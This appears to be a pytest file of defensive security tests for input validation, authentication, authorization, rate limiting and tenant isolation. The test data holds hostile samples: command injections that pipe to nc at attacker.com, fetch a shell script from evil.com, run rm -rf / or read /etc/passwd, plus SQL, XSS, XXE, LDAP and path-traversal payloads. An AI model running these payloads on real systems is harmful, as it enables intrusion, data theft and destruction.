"""
E2E Tests for Adversarial Security Scenarios

Comprehensive security testing including:
- Input validation and sanitization attacks
- Authentication bypass attempts
- Authorization escalation tests
- Rate limiting and DoS protection
- Injection attacks (SQL, XSS, command injection)
- Security boundary testing
"""

from __future__ import annotations

import hashlib
import html
import re
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Any

import pytest

from e2e.utils.test_helpers import (
    get_timestamp_iso,
    load_json_file,
    save_json_file,
)


@dataclass
class User:
    """User model for authentication tests."""
    user_id: str
    username: str
    password_hash: str
    role: str
    is_active: bool = True


@dataclass
class AuthToken:
    """Authentication token."""
    token: str
    user_id: str
    expires_at: str
    permissions: list[str]


class InputValidator:
    """Input validation utilities."""

    @staticmethod
    def validate_string(value: str, max_length: int = 1000) -> tuple[bool, str]:
        """Validate string input."""
        if not isinstance(value, str):
            return False, "Input must be a string"
        if len(value) > max_length:
            return False, f"Input exceeds maximum length of {max_length}"
        if len(value) == 0:
            return False, "Input cannot be empty"
        return True, ""

    @staticmethod
    def sanitize_html(value: str) -> str:
        """Sanitize HTML to prevent XSS."""
        return html.escape(value)

    @staticmethod
    def validate_sql_safe(value: str) -> tuple[bool, str]:
        """Check for SQL injection patterns."""
        sql_patterns = [
            r"(\bOR\b|\bAND\b).*?=.*?=",
            r";\s*DROP\s+TABLE",
            r"UNION\s+SELECT",
            r"--\s*$",
            r"\/\*.*?\*\/",
        ]

        for pattern in sql_patterns:
            if re.search(pattern, value, re.IGNORECASE):
                return False, "Potential SQL injection detected"

        return True, ""

    @staticmethod
    def validate_command_safe(value: str) -> tuple[bool, str]:
        """Check for command injection patterns."""
        dangerous_chars = [";", "|", "&", "$", "`", "\n", "(", ")"]

        for char in dangerous_chars:
            if char in value:
                return False, f"Dangerous character detected: {char}"

        return True, ""

    @staticmethod
    def validate_path_traversal(path: str) -> tuple[bool, str]:
        """Check for path traversal attacks."""
        if ".." in path:
            return False, "Path traversal attempt detected"
        if path.startswith("/"):
            return False, "Absolute paths not allowed"

        return True, ""


class RateLimiter:
    """Rate limiting implementation."""

    def __init__(self, max_requests: int, window_seconds: int):
        self.max_requests = max_requests
        self.window_seconds = window_seconds
        self.requests = {}

    def is_allowed(self, client_id: str) -> bool:
        """Check if request is allowed."""
        current_time = time.time()

        # Clean old requests
        if client_id in self.requests:
            self.requests[client_id] = [
                req_time for req_time in self.requests[client_id]
                if current_time - req_time < self.window_seconds
            ]
        else:
            self.requests[client_id] = []

        # Check limit
        if len(self.requests[client_id]) >= self.max_requests:
            return False

        # Record request
        self.requests[client_id].append(current_time)
        return True


class AuthenticationSystem:
    """Simple authentication system for testing."""

    def __init__(self):
        self.users = {}
        self.tokens = {}
        self.failed_attempts = {}
        self.max_failed_attempts = 3

    def register_user(self, username: str, password: str, role: str = "user") -> User:
        """Register a new user."""
        user_id = hashlib.sha256(username.encode()).hexdigest()[:16]
        password_hash = hashlib.sha256(password.encode()).hexdigest()

        user = User(
            user_id=user_id,
            username=username,
            password_hash=password_hash,
            role=role,
        )
        self.users[user_id] = user
        return user

    def authenticate(self, username: str, password: str) -> AuthToken | None:
        """Authenticate user and return token."""
        # Find user by username
        user = None
        for u in self.users.values():
            if u.username == username:
                user = u
                break

        if user is None:
            self._record_failed_attempt(username)
            return None

        # Check if account is locked
        if self._is_locked(username):
            return None

        # Verify password
        password_hash = hashlib.sha256(password.encode()).hexdigest()
        if password_hash != user.password_hash:
            self._record_failed_attempt(username)
            return None

        # Reset failed attempts
        self.failed_attempts[username] = 0

        # Generate token
        token_str = hashlib.sha256(
            f"{user.user_id}{time.time()}".encode()
        ).hexdigest()

        token = AuthToken(
            token=token_str,
            user_id=user.user_id,
            expires_at=get_timestamp_iso(),
            permissions=self._get_permissions(user.role),
        )

        self.tokens[token_str] = token
        return token

    def verify_token(self, token_str: str) -> AuthToken | None:
        """Verify authentication token."""
        return self.tokens.get(token_str)

    def _record_failed_attempt(self, username: str):
        """Record failed login attempt."""
        if username not in self.failed_attempts:
            self.failed_attempts[username] = 0
        self.failed_attempts[username] += 1

    def _is_locked(self, username: str) -> bool:
        """Check if account is locked due to failed attempts."""
        return self.failed_attempts.get(username, 0) >= self.max_failed_attempts

    def _get_permissions(self, role: str) -> list[str]:
        """Get permissions for role."""
        permissions_map = {
            "admin": ["read", "write", "delete", "admin"],
            "user": ["read", "write"],
            "guest": ["read"],
        }
        return permissions_map.get(role, [])


@pytest.mark.e2e
@pytest.mark.security
@pytest.mark.adversarial
class TestInputValidationAttacks:
    """E2E tests for input validation attacks."""

    def test_sql_injection_prevention(self):
        """Test prevention of SQL injection attacks."""
        # Arrange
        validator = InputValidator()

        malicious_inputs = [
            "admin' OR '1'='1",
            "'; DROP TABLE users; --",
            "1' UNION SELECT * FROM passwords--",
            "admin'/**/OR/**/1=1--",
        ]

        # Act & Assert
        for malicious_input in malicious_inputs:
            is_valid, error = validator.validate_sql_safe(malicious_input)
            assert not is_valid, f"SQL injection not detected: {malicious_input}"
            assert "SQL injection" in error

    def test_xss_attack_prevention(self):
        """Test prevention of XSS attacks."""
        # Arrange
        validator = InputValidator()

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
        ]

        # Act
        sanitized_outputs = [
            validator.sanitize_html(payload)
            for payload in xss_payloads
        ]

        # Assert
        for sanitized in sanitized_outputs:
            assert "<script>" not in sanitized
            assert "onerror=" not in sanitized
            assert "onload=" not in sanitized

    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        # Arrange
        validator = InputValidator()

        command_injections = [
            "file.txt; rm -rf /",
            "file.txt && cat /etc/passwd",
            "file.txt | nc attacker.com 1234",
            "$(curl evil.com/shell.sh)",
            "file.txt `whoami`",
        ]

        # Act & Assert
        for injection in command_injections:
            is_valid, error = validator.validate_command_safe(injection)
            assert not is_valid, f"Command injection not detected: {injection}"

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        # Arrange
        validator = InputValidator()

        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "....//....//etc/passwd",
            "/etc/passwd",
            "file/../../secret.txt",
        ]

        # Act & Assert
        for attempt in traversal_attempts:
            is_valid, error = validator.validate_path_traversal(attempt)
            assert not is_valid, f"Path traversal not detected: {attempt}"

    def test_buffer_overflow_prevention(self):
        """Test prevention of buffer overflow via length validation."""
        # Arrange
        validator = InputValidator()
        max_length = 1000

        # Create oversized input
        oversized_input = "A" * 10000

        # Act
        is_valid, error = validator.validate_string(oversized_input, max_length)

        # Assert
        assert not is_valid
        assert "exceeds maximum length" in error

    def test_null_byte_injection_prevention(self):
        """Test prevention of null byte injection."""
        # Arrange
        validator = InputValidator()

        null_byte_inputs = [
            "file.txt\x00.php",
            "normal\x00malicious",
        ]

        # Act & Assert
        for null_input in null_byte_inputs:
            # In real system, should detect and reject null bytes
            has_null = "\x00" in null_input
            assert has_null

    def test_ldap_injection_prevention(self):
        """Test prevention of LDAP injection."""
        # Arrange
        ldap_injections = [
            "*)(uid=*",
            "admin)(|(password=*))",
            "*)(objectClass=*",
        ]

        # Act - Validate LDAP input
        def is_safe_ldap_input(value: str) -> bool:
            dangerous_chars = ["*", "(", ")", "|", "&"]
            return not any(char in value for char in dangerous_chars)

        # Assert
        for injection in ldap_injections:
            assert not is_safe_ldap_input(injection)

    def test_xml_injection_prevention(self):
        """Test prevention of XML injection."""
        # Arrange
        xml_injections = [
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
            "<user><name>admin</name><role>admin</role></user>",
        ]

        # Act - Check for XML patterns
        def contains_xml_injection(value: str) -> bool:
            xml_patterns = [
                r"<!ENTITY",
                r"<!DOCTYPE",
                r"SYSTEM\s+['\"]file://",
            ]
            return any(re.search(p, value) for p in xml_patterns)

        # Assert
        for injection in xml_injections:
            if "ENTITY" in injection or "DOCTYPE" in injection:
                assert contains_xml_injection(injection)


@pytest.mark.e2e
@pytest.mark.security
@pytest.mark.adversarial
class TestAuthenticationBypass:
    """E2E tests for authentication bypass attempts."""

    def test_brute_force_protection(self):
        """Test protection against brute force attacks."""
        # Arrange
        auth_system = AuthenticationSystem()
        auth_system.register_user("testuser", "correct_password")

        # Act - Attempt multiple failed logins
        failed_attempts = 0
        for i in range(5):
            token = auth_system.authenticate("testuser", "wrong_password")
            if token is None:
                failed_attempts += 1

        # Try with correct password after lockout
        token = auth_system.authenticate("testuser", "correct_password")

        # Assert
        assert failed_attempts == 5
        assert token is None  # Account should be locked

    def test_credential_stuffing_detection(self):
        """Test detection of credential stuffing attacks."""
        # Arrange
        auth_system = AuthenticationSystem()
        rate_limiter = RateLimiter(max_requests=5, window_seconds=60)

        # Simulate credential stuffing
        client_ip = "192.168.1.100"
        attempts = []

        # Act
        for i in range(10):
            if rate_limiter.is_allowed(client_ip):
                token = auth_system.authenticate(f"user_{i}", "password")
                attempts.append(("allowed", token))
            else:
                attempts.append(("blocked", None))

        blocked_count = sum(1 for status, _ in attempts if status == "blocked")

        # Assert
        assert blocked_count >= 5  # Should block after rate limit

    def test_session_fixation_prevention(self):
        """Test prevention of session fixation attacks."""
        # Arrange
        auth_system = AuthenticationSystem()
        user = auth_system.register_user("testuser", "password")

        # Act - Attacker tries to set known session token
        attacker_token = "known_token_12345"

        # User authenticates - should get NEW token
        token = auth_system.authenticate("testuser", "password")

        # Assert
        assert token is not None
        assert token.token != attacker_token

    def test_token_theft_mitigation(self):
        """Test mitigation of token theft."""
        # Arrange
        auth_system = AuthenticationSystem()
        user = auth_system.register_user("testuser", "password")
        token = auth_system.authenticate("testuser", "password")

        # Act - Simulate token theft and reuse
        stolen_token = token.token

        # Verify token works
        verified = auth_system.verify_token(stolen_token)

        # In real system, would check IP, user agent, etc.
        # For now, just verify basic token validation works

        # Assert
        assert verified is not None
        assert verified.user_id == user.user_id

    def test_default_credential_prevention(self):
        """Test prevention of default credentials."""
        # Arrange
        default_credentials = [
            ("admin", "admin"),
            ("root", "root"),
            ("administrator", "password"),
            ("guest", "guest"),
        ]

        # Act - Try to create users with default credentials
        def is_default_credential(username: str, password: str) -> bool:
            return (username, password) in default_credentials

        # Assert
        for username, password in default_credentials:
            assert is_default_credential(username, password)

    def test_timing_attack_resistance(self):
        """Test resistance to timing attacks."""
        # Arrange
        auth_system = AuthenticationSystem()
        auth_system.register_user("testuser", "correct_password")

        # Act - Measure authentication times
        times = []

        for _ in range(10):
            start = time.time()
            auth_system.authenticate("testuser", "wrong_password")
            elapsed = time.time() - start
            times.append(elapsed)

        # Assert - Times should be relatively consistent
        avg_time = sum(times) / len(times)
        max_deviation = max(abs(t - avg_time) for t in times)

        # Allow some variance but not orders of magnitude
        assert max_deviation < avg_time * 2


@pytest.mark.e2e
@pytest.mark.security
@pytest.mark.adversarial
class TestAuthorizationEscalation:
    """E2E tests for authorization escalation attempts."""

    def test_privilege_escalation_prevention(self):
        """Test prevention of privilege escalation."""
        # Arrange
        auth_system = AuthenticationSystem()
        regular_user = auth_system.register_user("user", "password", role="user")
        admin_user = auth_system.register_user("admin", "password", role="admin")

        user_token = auth_system.authenticate("user", "password")

        # Act - Regular user tries to access admin function
        def requires_admin(token: AuthToken) -> bool:
            return "admin" in token.permissions

        can_access = requires_admin(user_token)

        # Assert
        assert not can_access

    def test_horizontal_privilege_escalation(self):
        """Test prevention of accessing other users' resources."""
        # Arrange
        auth_system = AuthenticationSystem()
        user1 = auth_system.register_user("user1", "password")
        user2 = auth_system.register_user("user2", "password")

        token1 = auth_system.authenticate("user1", "password")

        # Act - User1 tries to access User2's data
        def can_access_resource(token: AuthToken, resource_owner_id: str) -> bool:
            return token.user_id == resource_owner_id

        can_access = can_access_resource(token1, user2.user_id)

        # Assert
        assert not can_access

    def test_role_based_access_control(self):
        """Test RBAC enforcement."""
        # Arrange
        auth_system = AuthenticationSystem()

        users = {
            "admin": auth_system.register_user("admin", "pass", role="admin"),
            "user": auth_system.register_user("user", "pass", role="user"),
            "guest": auth_system.register_user("guest", "pass", role="guest"),
        }

        tokens = {
            role: auth_system.authenticate(role, "pass")
            for role in users.keys()
        }

        # Act - Check permissions
        def has_permission(token: AuthToken, permission: str) -> bool:
            return permission in token.permissions

        # Assert
        assert has_permission(tokens["admin"], "delete")
        assert not has_permission(tokens["user"], "delete")
        assert not has_permission(tokens["guest"], "write")

    def test_permission_bypass_prevention(self):
        """Test prevention of permission bypass."""
        # Arrange
        auth_system = AuthenticationSystem()
        user = auth_system.register_user("user", "password", role="user")
        token = auth_system.authenticate("user", "password")

        # Act - Try to bypass permission check
        required_permission = "admin"

        # Attempt various bypass techniques
        bypass_attempts = [
            "admin",
            " admin ",
            "ADMIN",
            "admin\x00",
            "../admin",
        ]

        results = []
        for attempt in bypass_attempts:
            # Normalize and check
            normalized = attempt.strip().lower()
            has_perm = normalized in [p.lower() for p in token.permissions]
            results.append(has_perm)

        # Assert
        assert not any(results)

    def test_insecure_direct_object_reference(self):
        """Test prevention of IDOR vulnerabilities."""
        # Arrange
        resources = {
            "resource_1": {"owner": "user1", "data": "private data 1"},
            "resource_2": {"owner": "user2", "data": "private data 2"},
        }

        # Act - User1 tries to access resource_2 by changing ID
        def access_resource(user_id: str, resource_id: str) -> dict | None:
            resource = resources.get(resource_id)
            if resource and resource["owner"] == user_id:
                return resource
            return None

        result = access_resource("user1", "resource_2")

        # Assert
        assert result is None


@pytest.mark.e2e
@pytest.mark.security
@pytest.mark.adversarial
class TestRateLimitingDoS:
    """E2E tests for rate limiting and DoS protection."""

    def test_request_rate_limiting(self):
        """Test basic request rate limiting."""
        # Arrange
        rate_limiter = RateLimiter(max_requests=10, window_seconds=1)
        client_id = "client_1"

        # Act
        allowed_count = 0
        blocked_count = 0

        for _ in range(20):
            if rate_limiter.is_allowed(client_id):
                allowed_count += 1
            else:
                blocked_count += 1

        # Assert
        assert allowed_count == 10
        assert blocked_count == 10

    def test_per_user_rate_limiting(self):
        """Test per-user rate limiting."""
        # Arrange
        rate_limiter = RateLimiter(max_requests=5, window_seconds=1)

        # Act
        results = {}
        for user_id in ["user1", "user2", "user3"]:
            allowed = 0
            for _ in range(10):
                if rate_limiter.is_allowed(user_id):
                    allowed += 1
            results[user_id] = allowed

        # Assert
        for user_id, count in results.items():
            assert count == 5

    def test_sliding_window_rate_limiting(self):
        """Test sliding window rate limiting."""
        # Arrange
        rate_limiter = RateLimiter(max_requests=5, window_seconds=2)
        client_id = "client_1"

        # Act - Make requests, wait, make more
        first_batch = sum(
            1 for _ in range(5)
            if rate_limiter.is_allowed(client_id)
        )

        # Should be blocked now
        blocked = not rate_limiter.is_allowed(client_id)

        # Wait for window to slide
        time.sleep(2.1)

        # Should be allowed again
        second_batch = sum(
            1 for _ in range(5)
            if rate_limiter.is_allowed(client_id)
        )

        # Assert
        assert first_batch == 5
        assert blocked
        assert second_batch == 5

    def test_distributed_dos_protection(self):
        """Test protection against distributed DoS."""
        # Arrange
        rate_limiter = RateLimiter(max_requests=10, window_seconds=1)

        # Simulate multiple attacking IPs
        attacker_ips = [f"192.168.1.{i}" for i in range(100)]

        # Act
        blocked_ips = []
        for ip in attacker_ips:
            # Each IP makes 20 requests
            blocked_count = 0
            for _ in range(20):
                if not rate_limiter.is_allowed(ip):
                    blocked_count += 1

            if blocked_count > 0:
                blocked_ips.append(ip)

        # Assert
        assert len(blocked_ips) == 100  # All IPs should be rate-limited

    def test_resource_exhaustion_prevention(self):
        """Test prevention of resource exhaustion attacks."""
        # Arrange
        max_memory_mb = 100
        max_connections = 1000

        # Simulate resource tracking
        current_memory = 0
        current_connections = 0

        # Act
        def allocate_resources(memory_mb: int, connections: int) -> bool:
            nonlocal current_memory, current_connections
            if (
                current_memory + memory_mb > max_memory_mb
                or current_connections + connections > max_connections
            ):
                return False

            current_memory += memory_mb
            current_connections += connections
            return True

        # Try to exhaust resources
        successful_allocations = 0
        for _ in range(200):
            if allocate_resources(1, 10):
                successful_allocations += 1

        # Assert
        assert current_memory <= max_memory_mb
        assert current_connections <= max_connections

    def test_slowloris_attack_prevention(self):
        """Test prevention of slowloris-style attacks."""
        # Arrange
        connection_timeout = 5.0  # seconds
        connections = []

        # Act
        def add_connection(connection_time: float):
            current_time = time.time()
            # Remove old connections
            active = [
                conn for conn in connections
                if current_time - conn < connection_timeout
            ]
            connections.clear()
            connections.extend(active)

            # Add new connection
            connections.append(current_time)
            return len(connections)

        # Simulate slow connections
        connection_count = add_connection(time.time())
        time.sleep(6.0)  # Wait longer than timeout

        # Add new connection
        new_count = add_connection(time.time())

        # Assert
        assert new_count == 1  # Old connections should be cleared


@pytest.mark.e2e
@pytest.mark.security
@pytest.mark.adversarial
@pytest.mark.slow
class TestSecurityBoundaries:
    """E2E tests for security boundary enforcement."""

    def test_sandbox_escape_prevention(self, test_temp_dir):
        """Test prevention of sandbox escape attempts."""
        # Arrange
        sandbox_dir = Path(test_temp_dir) / "sandbox"
        sandbox_dir.mkdir(parents=True, exist_ok=True)

        # Act - Try to access outside sandbox
        def is_within_sandbox(path: str, sandbox: Path) -> bool:
            try:
                resolved = (sandbox / path).resolve()
                return resolved.is_relative_to(sandbox)
            except Exception:
                return False

        escape_attempts = [
            "../../../etc/passwd",
            "../../..",
            "subdir/../../..",
        ]

        # Assert
        for attempt in escape_attempts:
            assert not is_within_sandbox(attempt, sandbox_dir)

    def test_cross_tenant_isolation(self, test_temp_dir):
        """Test isolation between tenants."""
        # Arrange
        tenant_dir = Path(test_temp_dir) / "tenants"
        tenant_dir.mkdir(parents=True, exist_ok=True)

        # Create tenant data
        tenants = {
            "tenant_a": {"data": "tenant A private data"},
            "tenant_b": {"data": "tenant B private data"},
        }

        for tenant_id, data in tenants.items():
            tenant_path = tenant_dir / tenant_id
            tenant_path.mkdir(exist_ok=True)
            save_json_file(data, tenant_path / "data.json")

        # Act - Tenant A tries to access Tenant B data
        def access_tenant_data(accessor_tenant: str, target_tenant: str) -> dict | None:
            if accessor_tenant != target_tenant:
                return None

            tenant_path = tenant_dir / target_tenant / "data.json"
            if tenant_path.exists():
                return load_json_file(tenant_path)
            return None

        result = access_tenant_data("tenant_a", "tenant_b")

        # Assert
        assert result is None

    def test_data_leakage_prevention(self):
        """Test prevention of data leakage in errors."""
        # Arrange
        def process_sensitive_data(data: dict):
            # Simulate error
            raise Exception("Processing failed")

        # Act
        error_message = ""
        try:
            process_sensitive_data({"password": "secret123", "ssn": "123-45-6789"})
        except Exception as e:
            error_message = str(e)

        # Assert - Error should not contain sensitive data
        assert "secret123" not in error_message
        assert "123-45-6789" not in error_message

    def test_information_disclosure_prevention(self):
        """Test prevention of information disclosure."""
        # Arrange
        def get_user_info(user_id: str) -> dict:
            # Simulate user lookup
            users = {
                "user1": {
                    "id": "user1",
                    "name": "John Doe",
                    "email": "john@example.com",
                    "password_hash": "secret_hash",
                    "internal_id": "12345",
                },
            }

            user = users.get(user_id)
            if not user:
                return {}

            # Filter sensitive fields
            public_fields = ["id", "name"]
            return {k: v for k, v in user.items() if k in public_fields}

        # Act
        user_info = get_user_info("user1")

        # Assert
        assert "password_hash" not in user_info
        assert "internal_id" not in user_info
        assert "name" in user_info

    def test_server_info_disclosure_prevention(self):
        """Test prevention of server information disclosure."""
        # Arrange
        server_headers = {
            "X-Powered-By": "Project-AI/1.0",
            "Server": "CustomServer/2.0",
        }

        # Act - Remove identifying headers
        safe_headers = {}
        sensitive_header_prefixes = ["X-Powered-By", "Server", "X-AspNet"]

        for key, value in server_headers.items():
            if not any(key.startswith(prefix) for prefix in sensitive_header_prefixes):
                safe_headers[key] = value

        # Assert
        assert "X-Powered-By" not in safe_headers
        assert "Server" not in safe_headers

    def test_cors_policy_enforcement(self):
        """Test CORS policy enforcement."""
        # Arrange
        allowed_origins = ["https://app.example.com", "https://api.example.com"]

        # Act
        def is_origin_allowed(origin: str) -> bool:
            return origin in allowed_origins

        # Test various origins
        test_cases = [
            ("https://app.example.com", True),
            ("https://evil.com", False),
            ("http://app.example.com", False),  # Protocol mismatch
        ]

        # Assert
        for origin, expected in test_cases:
            assert is_origin_allowed(origin) == expected
